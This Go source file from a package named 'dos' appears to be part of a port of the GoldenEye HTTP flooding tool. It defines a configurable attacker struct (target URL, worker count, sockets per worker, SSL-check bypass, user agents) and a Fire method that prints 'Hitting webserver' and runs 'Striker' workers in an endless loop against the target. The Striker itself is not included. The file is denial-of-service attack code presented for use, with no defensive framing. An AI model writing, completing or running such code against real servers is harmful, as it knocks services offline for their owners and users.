package dos

import (
	"context"
	"fmt"
	"sync"
)

type GoldenEye struct {
	URL          string
	Workers      int
	Sockets      int
	Method       string
	Debug        bool
	NoSSLCheck   bool
	UserAgents   string
	Counter      []int
	WorkersQueue []*Striker
}

func NewGoldenEye(url string, workers, sockets int, method string, debug, noSSLCheck bool, userAgents string) *GoldenEye {
	return &GoldenEye{
		URL:        url,
		Workers:    workers,
		Sockets:    sockets,
		Method:     method,
		Debug:      debug,
		NoSSLCheck: noSSLCheck,
		UserAgents: userAgents,
		Counter:    make([]int, 2),
	}
}

func (g *GoldenEye) Fire(ctx context.Context) {
	fmt.Printf("Hitting webserver in mode '%s' with %d workers running %d connections each. Hit CTRL+C to cancel.\n", g.Method, g.Workers, g.Sockets)

	var wg sync.WaitGroup
	for i := 0; i < g.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			striker := NewStriker(g.URL, g.Sockets, g.Counter, g.Method, g.Debug, g.NoSSLCheck, g.UserAgents)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					striker.Run()
				}
			}
		}()
	}
	wg.Wait()
}
